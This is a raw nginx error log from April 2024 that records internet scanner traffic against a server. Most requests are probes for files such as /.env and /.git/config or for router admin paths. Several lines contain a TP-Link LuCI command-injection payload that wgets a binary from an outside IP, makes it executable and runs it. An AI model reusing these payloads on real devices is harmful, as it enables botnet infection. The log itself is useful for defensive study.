2024/04/17 08:34:17 [notice] 1#1: using the "epoll" event method
2024/04/17 08:34:17 [notice] 1#1: nginx/1.22.1
2024/04/17 08:34:17 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
2024/04/17 08:34:17 [notice] 1#1: OS: Linux 3.10.0-1160.108.1.el7.x86_64
2024/04/17 08:34:17 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2024/04/17 08:34:17 [notice] 1#1: start worker processes
2024/04/17 08:34:17 [notice] 1#1: start worker process 29
2024/04/17 08:34:17 [notice] 1#1: start worker process 30
2024/04/17 08:43:54 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2024/04/17 08:43:54 [notice] 29#29: gracefully shutting down
2024/04/17 08:43:54 [notice] 30#30: gracefully shutting down
2024/04/17 08:43:54 [notice] 29#29: exiting
2024/04/17 08:43:54 [notice] 30#30: exiting
2024/04/17 08:43:54 [notice] 29#29: exit
2024/04/17 08:43:54 [notice] 30#30: exit
2024/04/17 08:43:54 [notice] 1#1: signal 17 (SIGCHLD) received from 29
2024/04/17 08:43:54 [notice] 1#1: worker process 29 exited with code 0
2024/04/17 08:43:54 [notice] 1#1: signal 29 (SIGIO) received
2024/04/17 08:43:54 [notice] 1#1: signal 17 (SIGCHLD) received from 30
2024/04/17 08:43:54 [notice] 1#1: worker process 30 exited with code 0
2024/04/17 08:43:54 [notice] 1#1: exit
2024/04/17 08:45:35 [notice] 1#1: using the "epoll" event method
2024/04/17 08:45:35 [notice] 1#1: nginx/1.22.1
2024/04/17 08:45:35 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
2024/04/17 08:45:35 [notice] 1#1: OS: Linux 3.10.0-1160.108.1.el7.x86_64
2024/04/17 08:45:35 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2024/04/17 08:45:35 [notice] 1#1: start worker processes
2024/04/17 08:45:35 [notice] 1#1: start worker process 22
2024/04/17 08:45:35 [notice] 1#1: start worker process 23
2024/04/17 11:23:53 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2024/04/17 11:23:53 [notice] 22#22: gracefully shutting down
2024/04/17 11:23:53 [notice] 22#22: exiting
2024/04/17 11:23:53 [notice] 22#22: exit
2024/04/17 11:23:53 [notice] 23#23: gracefully shutting down
2024/04/17 11:23:53 [notice] 23#23: exiting
2024/04/17 11:23:53 [notice] 23#23: exit
2024/04/17 11:23:53 [notice] 1#1: signal 17 (SIGCHLD) received from 22
2024/04/17 11:23:53 [notice] 1#1: worker process 22 exited with code 0
2024/04/17 11:23:53 [notice] 1#1: worker process 23 exited with code 0
2024/04/17 11:23:53 [notice] 1#1: exit
2024/04/17 11:27:16 [notice] 1#1: using the "epoll" event method
2024/04/17 11:27:16 [notice] 1#1: nginx/1.22.1
2024/04/17 11:27:16 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
2024/04/17 11:27:16 [notice] 1#1: OS: Linux 3.10.0-1160.108.1.el7.x86_64
2024/04/17 11:27:16 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2024/04/17 11:27:16 [notice] 1#1: start worker processes
2024/04/17 11:27:16 [notice] 1#1: start worker process 22
2024/04/17 11:27:16 [notice] 1#1: start worker process 23
2024/04/17 11:30:44 [error] 22#22: *1 directory index of "/usr/share/nginx/html/" is forbidden, client: 212.70.149.134, server: localhost, request: "GET / HTTP/1.0"
2024/04/22 09:07:19 [error] 23#23: *670 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.191.126.213, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 09:10:00 [error] 23#23: *671 directory index of "/usr/share/nginx/html/" is forbidden, client: 71.6.167.142, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 09:10:01 [error] 23#23: *672 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 71.6.167.142, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "8.148.22.188"
2024/04/22 09:10:02 [error] 23#23: *673 open() "/usr/share/nginx/html/sitemap.xml" failed (2: No such file or directory), client: 71.6.167.142, server: localhost, request: "GET /sitemap.xml HTTP/1.1", host: "8.148.22.188"
2024/04/22 09:10:05 [error] 23#23: *674 open() "/usr/share/nginx/html/.well-known/security.txt" failed (2: No such file or directory), client: 71.6.167.142, server: localhost, request: "GET /.well-known/security.txt HTTP/1.1", host: "8.148.22.188"
2024/04/22 09:10:08 [error] 22#22: *675 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 71.6.167.142, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/22 09:21:53 [error] 22#22: *676 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.224.128.43, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 09:53:19 [error] 22#22: *677 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 10:02:42 [error] 22#22: *678 open() "/usr/share/nginx/html/__cl/cg" failed (2: No such file or directory), client: 112.126.87.3, server: localhost, request: "GET /__cl/cg HTTP/1.1", host: "8.148.22.188"
2024/04/22 10:02:42 [error] 22#22: *679 open() "/usr/share/nginx/html/slive/ftv_ftv_4k_hevc_73d_42080_default_466_hls.smil/playlist.m3u8" failed (2: No such file or directory), client: 112.126.87.3, server: localhost, request: "GET /slive/ftv_ftv_4k_hevc_73d_42080_default_466_hls.smil/playlist.m3u8 HTTP/1.1", host: "8.148.22.188"
2024/04/22 10:02:42 [error] 22#22: *680 open() "/usr/share/nginx/html/login" failed (2: No such file or directory), client: 112.126.87.3, server: localhost, request: "GET /login?redirect=%2Fmanage HTTP/1.1", host: "8.148.22.188"
2024/04/22 10:54:39 [error] 22#22: *686 open() "/usr/share/nginx/html/druid/index.html" failed (2: No such file or directory), client: 192.241.236.69, server: localhost, request: "GET /druid/index.html HTTP/1.1", host: "8.148.22.188"
2024/04/22 10:56:35 [error] 22#22: *687 open() "/usr/share/nginx/html/hudson" failed (2: No such file or directory), client: 107.170.244.26, server: localhost, request: "GET /hudson HTTP/1.1", host: "8.148.22.188"
2024/04/22 11:04:59 [error] 22#22: *688 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.242.226.99, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 11:31:57 [error] 22#22: *689 open() "/usr/share/nginx/html/manager/text/list" failed (2: No such file or directory), client: 192.241.233.53, server: localhost, request: "GET /manager/text/list HTTP/1.1", host: "8.148.22.188"
2024/04/22 11:43:18 [error] 22#22: *690 open() "/usr/share/nginx/html/cgi-sys/defaultwebpage.cgi" failed (2: No such file or directory), client: 179.43.191.18, server: localhost, request: "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1", host: "8.148.22.188", referrer: "https://8.148.22.188"
2024/04/22 13:30:31 [error] 23#23: *691 directory index of "/usr/share/nginx/html/" is forbidden, client: 80.94.92.60, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 13:35:51 [error] 23#23: *692 open() "/usr/share/nginx/html/Kvsh/geti.php" failed (2: No such file or directory), client: 67.217.48.178, server: localhost, request: "GET /Kvsh/geti.php HTTP/1.1", host: "unique-li.club"
2024/04/22 13:35:53 [error] 23#23: *693 open() "/usr/share/nginx/html/Kvsh/c.php" failed (2: No such file or directory), client: 67.217.48.178, server: localhost, request: "GET /Kvsh/c.php?server=1&type=1 HTTP/1.1", host: "unique-li.club"
2024/04/22 13:35:53 [error] 23#23: *694 open() "/usr/share/nginx/html/Kvsh/login/index_main.php" failed (2: No such file or directory), client: 67.217.48.178, server: localhost, request: "POST /Kvsh/login/index_main.php HTTP/1.1", host: "unique-li.club"
2024/04/22 13:53:16 [error] 23#23: *695 directory index of "/usr/share/nginx/html/" is forbidden, client: 44.220.185.50, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 14:52:36 [error] 23#23: *696 directory index of "/usr/share/nginx/html/" is forbidden, client: 141.98.11.128, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 15:10:56 [error] 23#23: *697 directory index of "/usr/share/nginx/html/" is forbidden, client: 159.89.239.252, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 15:15:50 [error] 23#23: *698 open() "/usr/share/nginx/html/cgi-sys/defaultwebpage.cgi" failed (2: No such file or directory), client: 179.43.191.18, server: localhost, request: "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1", host: "8.148.22.188", referrer: "https://8.148.22.188"
2024/04/22 15:19:46 [error] 23#23: *699 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 5.181.190.250, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 15:30:05 [error] 23#23: *700 directory index of "/usr/share/nginx/html/" is forbidden, client: 141.98.11.128, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 15:39:10 [error] 23#23: *701 directory index of "/usr/share/nginx/html/" is forbidden, client: 80.94.92.60, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 15:58:01 [error] 23#23: *704 directory index of "/usr/share/nginx/html/" is forbidden, client: 35.216.194.252, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 15:58:02 [error] 23#23: *705 open() "/usr/share/nginx/html/info.php" failed (2: No such file or directory), client: 35.216.194.252, server: localhost, request: "GET /info.php HTTP/1.1", host: "8.148.22.188"
2024/04/22 15:58:02 [error] 23#23: *706 open() "/usr/share/nginx/html/.git/config" failed (2: No such file or directory), client: 35.216.194.252, server: localhost, request: "GET /.git/config HTTP/1.1", host: "8.148.22.188"
2024/04/22 15:58:03 [error] 22#22: *707 open() "/usr/share/nginx/html/server-status" failed (2: No such file or directory), client: 35.216.194.252, server: localhost, request: "GET /server-status HTTP/1.1", host: "8.148.22.188"
2024/04/22 15:58:03 [error] 22#22: *708 open() "/usr/share/nginx/html/config.json" failed (2: No such file or directory), client: 35.216.194.252, server: localhost, request: "GET /config.json HTTP/1.1", host: "8.148.22.188"
2024/04/22 15:58:04 [error] 22#22: *709 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 35.216.194.252, server: localhost, request: "GET /.env HTTP/1.1", host: "8.148.22.188"
2024/04/22 15:58:04 [error] 22#22: *710 open() "/usr/share/nginx/html/telescope/requests" failed (2: No such file or directory), client: 35.216.194.252, server: localhost, request: "GET /telescope/requests HTTP/1.1", host: "8.148.22.188"
2024/04/22 16:15:54 [error] 22#22: *712 directory index of "/usr/share/nginx/html/" is forbidden, client: 47.236.251.7, server: localhost, request: "GET http://passport.baidu.com/ HTTP/1.1", host: "passport.baidu.com:80"
2024/04/22 16:21:36 [error] 22#22: *715 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 16:34:52 [error] 22#22: *716 directory index of "/usr/share/nginx/html/" is forbidden, client: 141.98.11.128, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 16:50:09 [error] 22#22: *717 directory index of "/usr/share/nginx/html/" is forbidden, client: 34.78.249.41, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 16:55:37 [error] 22#22: *718 directory index of "/usr/share/nginx/html/" is forbidden, client: 141.98.11.128, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 17:11:27 [error] 22#22: *720 directory index of "/usr/share/nginx/html/" is forbidden, client: 58.171.68.115, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 17:12:06 [error] 22#22: *721 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.191.126.213, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 17:33:26 [error] 22#22: *722 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 107.175.70.170, server: localhost, request: "GET /.env HTTP/1.1", host: "8.148.22.188"
2024/04/22 17:33:26 [error] 23#23: *723 directory index of "/usr/share/nginx/html/" is forbidden, client: 107.175.70.170, server: localhost, request: "POST / HTTP/1.1", host: "8.148.22.188"
2024/04/22 17:39:57 [error] 23#23: *724 directory index of "/usr/share/nginx/html/" is forbidden, client: 164.92.114.247, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 17:39:57 [error] 23#23: *725 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 164.92.114.247, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "8.148.22.188"
2024/04/22 17:39:58 [error] 23#23: *726 open() "/usr/share/nginx/html/sitemap.xml" failed (2: No such file or directory), client: 164.92.114.247, server: localhost, request: "GET /sitemap.xml HTTP/1.1", host: "8.148.22.188"
2024/04/22 17:39:58 [error] 23#23: *727 open() "/usr/share/nginx/html/.well-known/security.txt" failed (2: No such file or directory), client: 164.92.114.247, server: localhost, request: "GET /.well-known/security.txt HTTP/1.1", host: "8.148.22.188"
2024/04/22 17:39:59 [error] 23#23: *728 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 164.92.114.247, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/22 17:57:05 [error] 23#23: *729 directory index of "/usr/share/nginx/html/" is forbidden, client: 104.152.52.89, server: localhost, request: "GET / HTTP/1.0"
2024/04/22 18:06:49 [error] 23#23: *731 open() "/usr/share/nginx/html/hQRQ" failed (2: No such file or directory), client: 148.153.45.234, server: localhost, request: "GET /hQRQ HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 18:06:49 [error] 23#23: *732 open() "/usr/share/nginx/html/2adf" failed (2: No such file or directory), client: 148.153.45.234, server: localhost, request: "GET /2adf HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 18:06:50 [error] 23#23: *733 open() "/usr/share/nginx/html/aab8" failed (2: No such file or directory), client: 148.153.45.234, server: localhost, request: "GET /aab8 HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 18:06:50 [error] 23#23: *734 open() "/usr/share/nginx/html/jquery-3.3.1.slim.min.js" failed (2: No such file or directory), client: 148.153.45.234, server: localhost, request: "GET /jquery-3.3.1.slim.min.js HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 18:06:50 [error] 23#23: *735 open() "/usr/share/nginx/html/aab9" failed (2: No such file or directory), client: 148.153.45.234, server: localhost, request: "GET /aab9 HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 18:06:51 [error] 23#23: *736 open() "/usr/share/nginx/html/jquery-3.3.2.slim.min.js" failed (2: No such file or directory), client: 148.153.45.234, server: localhost, request: "GET /jquery-3.3.2.slim.min.js HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 19:00:24 [error] 23#23: *738 directory index of "/usr/share/nginx/html/" is forbidden, client: 104.152.52.39, server: localhost, request: "GET / HTTP/1.0"
2024/04/22 19:00:24 [error] 22#22: *739 open() "/usr/share/nginx/html/nmaplowercheck1713812424" failed (2: No such file or directory), client: 104.152.52.39, server: localhost, request: "GET /nmaplowercheck1713812424 HTTP/1.1", host: "8.148.22.188"
2024/04/22 19:00:24 [error] 22#22: *740 open() "/usr/share/nginx/html/sdk" failed (2: No such file or directory), client: 104.152.52.39, server: localhost, request: "POST /sdk HTTP/1.1", host: "8.148.22.188"
2024/04/22 19:00:24 [error] 22#22: *741 directory index of "/usr/share/nginx/html/" is forbidden, client: 104.152.52.39, server: localhost, request: "GET / HTTP/1.0"
2024/04/22 19:00:25 [error] 22#22: *742 open() "/usr/share/nginx/html/evox/about" failed (2: No such file or directory), client: 104.152.52.39, server: localhost, request: "GET /evox/about HTTP/1.1", host: "8.148.22.188"
2024/04/22 19:00:25 [error] 22#22: *743 open() "/usr/share/nginx/html/HNAP1" failed (2: No such file or directory), client: 104.152.52.39, server: localhost, request: "GET /HNAP1 HTTP/1.1", host: "8.148.22.188"
2024/04/22 19:00:25 [error] 22#22: *744 directory index of "/usr/share/nginx/html/" is forbidden, client: 104.152.52.39, server: localhost, request: "GET / HTTP/1.0"
2024/04/22 19:00:26 [error] 22#22: *745 directory index of "/usr/share/nginx/html/" is forbidden, client: 104.152.52.39, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 19:01:21 [error] 22#22: *746 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.224.128.43, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 19:03:46 [error] 22#22: *747 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.165.191.27, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 19:03:46 [error] 22#22: *748 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 185.165.191.27, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "8.148.22.188"
2024/04/22 19:03:46 [error] 22#22: *749 open() "/usr/share/nginx/html/sitemap.xml" failed (2: No such file or directory), client: 185.165.191.27, server: localhost, request: "GET /sitemap.xml HTTP/1.1", host: "8.148.22.188"
2024/04/22 19:03:47 [error] 22#22: *750 open() "/usr/share/nginx/html/.well-known/security.txt" failed (2: No such file or directory), client: 185.165.191.27, server: localhost, request: "GET /.well-known/security.txt HTTP/1.1", host: "8.148.22.188"
2024/04/22 19:03:47 [error] 22#22: *751 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 185.165.191.27, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/22 19:45:35 [error] 22#22: *752 directory index of "/usr/share/nginx/html/" is forbidden, client: 77.37.238.101, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 19:48:02 [error] 22#22: *754 directory index of "/usr/share/nginx/html/" is forbidden, client: 104.152.52.45, server: localhost, request: "GET / HTTP/1.0"
2024/04/22 19:48:02 [error] 23#23: *755 directory index of "/usr/share/nginx/html/" is forbidden, client: 104.152.52.45, server: localhost, request: "GET / HTTP/1.0"
2024/04/22 19:48:02 [error] 23#23: *757 open() "/usr/share/nginx/html/nmaplowercheck1713815282" failed (2: No such file or directory), client: 104.152.52.45, server: localhost, request: "GET /nmaplowercheck1713815282 HTTP/1.1", host: "8.148.22.188"
2024/04/22 19:48:02 [error] 23#23: *756 open() "/usr/share/nginx/html/sdk" failed (2: No such file or directory), client: 104.152.52.45, server: localhost, request: "POST /sdk HTTP/1.1", host: "8.148.22.188"
2024/04/22 19:48:03 [error] 23#23: *758 open() "/usr/share/nginx/html/evox/about" failed (2: No such file or directory), client: 104.152.52.45, server: localhost, request: "GET /evox/about HTTP/1.1", host: "8.148.22.188"
2024/04/22 19:48:03 [error] 23#23: *759 open() "/usr/share/nginx/html/HNAP1" failed (2: No such file or directory), client: 104.152.52.45, server: localhost, request: "GET /HNAP1 HTTP/1.1", host: "8.148.22.188"
2024/04/22 19:48:03 [error] 23#23: *760 directory index of "/usr/share/nginx/html/" is forbidden, client: 104.152.52.45, server: localhost, request: "GET / HTTP/1.0"
2024/04/22 19:48:04 [error] 23#23: *761 directory index of "/usr/share/nginx/html/" is forbidden, client: 104.152.52.45, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 20:08:50 [error] 23#23: *762 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 5.181.190.250, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 20:40:32 [error] 23#23: *763 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 20:57:50 [error] 23#23: *764 directory index of "/usr/share/nginx/html/" is forbidden, client: 193.118.53.58, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 20:57:53 [error] 23#23: *765 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 193.118.53.58, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/22 21:03:36 [error] 23#23: *766 directory index of "/usr/share/nginx/html/" is forbidden, client: 198.235.24.154, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 21:23:53 [error] 23#23: *768 directory index of "/usr/share/nginx/html/" is forbidden, client: 34.140.108.54, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 21:34:48 [error] 23#23: *769 open() "/usr/share/nginx/html/cpanel" failed (2: No such file or directory), client: 179.43.191.18, server: localhost, request: "GET /cpanel HTTP/1.1", host: "8.148.22.188", referrer: "https://8.148.22.188"
2024/04/22 22:43:31 [error] 22#22: *771 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.191.126.213, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 23:10:16 [error] 22#22: *772 directory index of "/usr/share/nginx/html/" is forbidden, client: 94.102.57.152, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 23:40:50 [error] 22#22: *775 directory index of "/usr/share/nginx/html/" is forbidden, client: 117.132.188.204, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 23:50:00 [error] 22#22: *776 directory index of "/usr/share/nginx/html/" is forbidden, client: 141.98.11.128, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/23 00:27:21 [error] 22#22: *777 directory index of "/usr/share/nginx/html/" is forbidden, client: 141.98.11.128, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/23 00:28:17 [error] 22#22: *778 directory index of "/usr/share/nginx/html/" is forbidden, client: 62.3.246.173, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/23 00:45:05 [error] 22#22: *779 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.224.128.43, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/23 01:17:40 [error] 22#22: *780 directory index of "/usr/share/nginx/html/" is forbidden, client: 138.122.48.202, server: localhost, request: "GET / HTTP/1.0", host: "8.148.22.188:80"
2024/04/23 01:32:14 [error] 22#22: *781 directory index of "/usr/share/nginx/html/" is forbidden, client: 107.170.231.23, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/23 01:34:59 [error] 22#22: *782 directory index of "/usr/share/nginx/html/" is forbidden, client: 141.98.11.128, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/23 01:50:52 [error] 22#22: *783 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 5.181.190.250, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/23 01:57:25 [error] 22#22: *784 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.242.226.80, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/23 02:00:51 [error] 22#22: *785 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 46.8.43.78, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "8.148.22.188:80", referrer: "http://8.148.22.188:80/admin/login.asp"
2024/04/23 02:38:49 [error] 23#23: *789 directory index of "/usr/share/nginx/html/" is forbidden, client: 141.98.11.128, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/23 02:50:58 [error] 23#23: *791 directory index of "/usr/share/nginx/html/" is forbidden, client: 167.94.146.54, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/23 02:51:02 [error] 23#23: *792 directory index of "/usr/share/nginx/html/" is forbidden, client: 167.94.146.54, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/23 03:06:20 [error] 23#23: *794 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.224.128.43, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/23 03:25:28 [error] 23#23: *795 directory index of "/usr/share/nginx/html/" is forbidden, client: 146.19.24.28, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/23 03:41:09 [error] 23#23: *796 directory index of "/usr/share/nginx/html/" is forbidden, client: 35.203.211.234, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/23 03:41:27 [error] 23#23: *797 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/23 03:58:40 [error] 23#23: *798 directory index of "/usr/share/nginx/html/" is forbidden, client: 141.98.11.128, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/23 04:16:23 [error] 23#23: *802 directory index of "/usr/share/nginx/html/" is forbidden, client: 137.184.13.100, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/23 04:16:23 [error] 22#22: *803 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 137.184.13.100, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "8.148.22.188"
2024/04/23 04:16:24 [error] 22#22: *804 open() "/usr/share/nginx/html/sitemap.xml" failed (2: No such file or directory), client: 137.184.13.100, server: localhost, request: "GET /sitemap.xml HTTP/1.1", host: "8.148.22.188"
2024/04/23 04:16:24 [error] 22#22: *805 open() "/usr/share/nginx/html/.well-known/security.txt" failed (2: No such file or directory), client: 137.184.13.100, server: localhost, request: "GET /.well-known/security.txt HTTP/1.1", host: "8.148.22.188"
